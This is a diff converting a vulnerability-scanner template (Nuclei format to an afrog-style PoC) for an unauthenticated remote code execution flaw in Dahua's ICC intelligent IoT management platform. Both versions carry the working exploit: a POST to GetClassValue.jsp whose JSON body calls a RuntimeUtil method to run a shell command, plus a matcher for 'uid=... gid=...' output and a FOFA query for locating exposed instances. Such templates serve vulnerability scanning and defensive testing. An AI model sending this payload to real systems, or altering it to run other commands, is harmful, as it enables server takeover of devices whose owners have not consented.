@@ -1,41 +1,32 @@
 id: dahua-icc-getclassvalue-rce
 
 info:
-  name: Dahua 'GetClassValue' - Remote Code Execution
-  author: ProjectDiscoveryAI
+  name: 大华 ICC 智能物联综合管理平台 GetClassValue RCE
+  author: avic123
   severity: critical
-  description: |
-    Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.
+  verified: true
+  description: |-
+    大华智能物联综合管理平台GetClassValue.jsp存在远程代码执行漏洞，攻击者可获取服务器权限
+    fofa: app="dahua-智能物联综合管理平台"
   reference:
-    - https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml
-  metadata:
-    fofa-query: app="dahua-智能物联综合管理平台"
-    max-request: 1
-  tags: rce,java,dahua,iot,unauth
+    - https://cn-sec.com/archives/3585607.html
+  tags: dahua,icc,rce
+  created: 2025/01/06
 
-http:
-  - raw:
-      - |
-        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
-        Host: {{Hostname}}
+rules:
+  r0:
+    request:
+      method: POST
+      path: /evo-apigw/admin/API/Developer/GetClassValue.jsp
+      headers:
         Content-Type: application/json
-
+      body: |
         {
-            "data": {
-                "clazzName": "com.dahua.admin.util.RuntimeUtil",
-                "methodName": "syncexecReturnInputStream",
-                "fieldName": ["id"]
-            }
+          "data": {
+            "clazzName": "com.dahua.admin.util.RuntimeUtil",
+            "methodName": "syncexecReturnInputStream",
+            "fieldName": ["id"]
+          }
         }
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
-
-      - type: status
-        status:
-          - 200
-# digest: 480a0045304302200a18d5a0816e0aa6bb6c812f532509137be15818ebbb106c4a70250b797e3ae5021f15f0e7344f4ead99705d02ee6bd3fc10fd04d5a8c45ac47fa3337e3512221b:922c64590222798bb761d5b6d8e72950
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
